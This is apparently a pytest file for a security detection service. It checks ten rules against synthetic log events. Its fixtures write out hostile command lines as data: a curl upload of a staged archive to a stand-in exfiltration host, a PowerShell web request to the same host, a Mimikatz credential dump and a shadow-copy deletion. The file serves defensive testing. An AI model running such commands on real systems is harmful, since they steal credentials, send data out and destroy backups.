import pytest
import uuid
from datetime import datetime, timedelta
from app.services.elasticsearch_service import ElasticsearchService
from app.services.detection_service import DetectionService

@pytest.fixture
def detection_service(tmp_path):
    es = ElasticsearchService()
    es.is_active = False
    
    svc = DetectionService(es)
    svc.data_dir = tmp_path
    return svc

def test_rule_1_brute_force_positive_and_negative(detection_service):
    sim_id = uuid.uuid4()
    
    # 1. Positive case: 5 failed attempts within 2 mins
    start_time = datetime(2026, 7, 5, 12, 0, 0)
    events_pos = []
    for i in range(5):
        events_pos.append({
            "id": str(uuid.uuid4()),
            "timestamp": (start_time + timedelta(seconds=i * 10)).isoformat() + "Z",
            "host": {"hostname": "win-dc-01"},
            "user": {"name": "bjohnson"},
            "custom_fields": {"winlog_event_id": 4625}
        })
    alerts = detection_service.run_detection(sim_id, events_pos)
    assert len(alerts) == 1
    assert alerts[0]["rule_id"] == "RULE-001"
    
    # 2. Negative case: 4 failed attempts within 2 mins
    events_neg = events_pos[:4]
    alerts_neg = detection_service.run_detection(sim_id, events_neg)
    assert len(alerts_neg) == 0

def test_rule_2_successful_login_after_failures(detection_service):
    sim_id = uuid.uuid4()
    start_time = datetime(2026, 7, 5, 12, 0, 0)
    
    # 1. Positive: 4625 followed by 4624 within 5 mins for same user/host
    events = [
        {
            "id": str(uuid.uuid4()),
            "timestamp": start_time.isoformat() + "Z",
            "host": {"hostname": "win-dc-01"},
            "user": {"name": "bjohnson"},
            "custom_fields": {"winlog_event_id": 4625}
        },
        {
            "id": str(uuid.uuid4()),
            "timestamp": (start_time + timedelta(minutes=2)).isoformat() + "Z",
            "host": {"hostname": "win-dc-01"},
            "user": {"name": "bjohnson"},
            "custom_fields": {"winlog_event_id": 4624}
        }
    ]
    alerts = detection_service.run_detection(sim_id, events)
    # Note: 1 failure does not trigger Rule 1, but triggers Rule 2 (login after failure)
    assert len(alerts) == 1
    assert alerts[0]["rule_id"] == "RULE-002"

def test_rule_3_powershell_suspicious(detection_service):
    sim_id = uuid.uuid4()
    
    # Positive: contains Invoke-WebRequest
    events = [{
        "id": str(uuid.uuid4()),
        "timestamp": "2026-07-05T12:00:00Z",
        "custom_fields": {"winlog_event_id": 4104},
        "raw_log": "Invoke-WebRequest -Uri http://exfil.com"
    }]
    alerts = detection_service.run_detection(sim_id, events)
    assert len(alerts) == 1
    assert alerts[0]["rule_id"] == "RULE-003"

def test_rule_4_mimikatz(detection_service):
    sim_id = uuid.uuid4()
    
    # Positive: Command line contains logonpasswords
    events = [{
        "id": str(uuid.uuid4()),
        "timestamp": "2026-07-05T12:00:00Z",
        "custom_fields": {"winlog_event_id": 4688},
        "process": {"command_line": "mimikatz.exe sekurlsa::logonpasswords exit"}
    }]
    alerts = detection_service.run_detection(sim_id, events)
    assert len(alerts) == 1
    assert alerts[0]["rule_id"] == "RULE-004"

def test_rule_5_new_local_admin(detection_service):
    sim_id = uuid.uuid4()
    start_time = datetime(2026, 7, 5, 12, 0, 0)
    
    # Positive: 4720 (user creation) + 4732 (added to Administrators)
    events = [
        {
            "id": str(uuid.uuid4()),
            "timestamp": start_time.isoformat() + "Z",
            "host": {"hostname": "win-dc-01"},
            "custom_fields": {"winlog_event_id": 4720, "target_user": "backdoor_user"}
        },
        {
            "id": str(uuid.uuid4()),
            "timestamp": (start_time + timedelta(seconds=10)).isoformat() + "Z",
            "host": {"hostname": "win-dc-01"},
            "custom_fields": {"winlog_event_id": 4732, "group_name": "Administrators", "member_name": "backdoor_user"}
        }
    ]
    alerts = detection_service.run_detection(sim_id, events)
    assert len(alerts) == 1
    assert alerts[0]["rule_id"] == "RULE-005"

def test_rule_6_scheduled_task(detection_service):
    sim_id = uuid.uuid4()
    events = [{
        "id": str(uuid.uuid4()),
        "timestamp": "2026-07-05T12:00:00Z",
        "custom_fields": {"winlog_event_id": 4698, "task_name": "BackdoorUpdate"}
    }]
    alerts = detection_service.run_detection(sim_id, events)
    assert len(alerts) == 1
    assert alerts[0]["rule_id"] == "RULE-006"

def test_rule_7_service_installation(detection_service):
    sim_id = uuid.uuid4()
    events = [{
        "id": str(uuid.uuid4()),
        "timestamp": "2026-07-05T12:00:00Z",
        "custom_fields": {"winlog_event_id": 4697, "service_name": "MalSvc"}
    }]
    alerts = detection_service.run_detection(sim_id, events)
    assert len(alerts) == 1
    assert alerts[0]["rule_id"] == "RULE-007"

def test_rule_8_ssh_brute_force(detection_service):
    sim_id = uuid.uuid4()
    start_time = datetime(2026, 7, 5, 12, 0, 0)
    
    events = []
    for i in range(5):
        events.append({
            "id": str(uuid.uuid4()),
            "timestamp": (start_time + timedelta(seconds=i * 5)).isoformat() + "Z",
            "log_source": "auth_log",
            "event_type": "authentication_failure",
            "host": {"hostname": "lnx-srv-01"},
            "user": {"name": "root"},
            "raw_log": "Failed password for root"
        })
        
    alerts = detection_service.run_detection(sim_id, events)
    assert len(alerts) == 1
    assert alerts[0]["rule_id"] == "RULE-008"

def test_rule_9_impact(detection_service):
    sim_id = uuid.uuid4()
    events = [{
        "id": str(uuid.uuid4()),
        "timestamp": "2026-07-05T12:00:00Z",
        "custom_fields": {"winlog_event_id": 4688},
        "process": {"command_line": "vssadmin delete shadows /all /quiet"}
    }]
    alerts = detection_service.run_detection(sim_id, events)
    assert len(alerts) == 1
    assert alerts[0]["rule_id"] == "RULE-009"

def test_rule_10_exfiltration(detection_service):
    sim_id = uuid.uuid4()
    events = [{
        "id": str(uuid.uuid4()),
        "timestamp": "2026-07-05T12:00:00Z",
        "custom_fields": {"winlog_event_id": 4688},
        "process": {"command_line": "curl -F file=@staged.zip http://exfil.com"}
    }]
    alerts = detection_service.run_detection(sim_id, events)
    assert len(alerts) == 1
    assert alerts[0]["rule_id"] == "RULE-010"
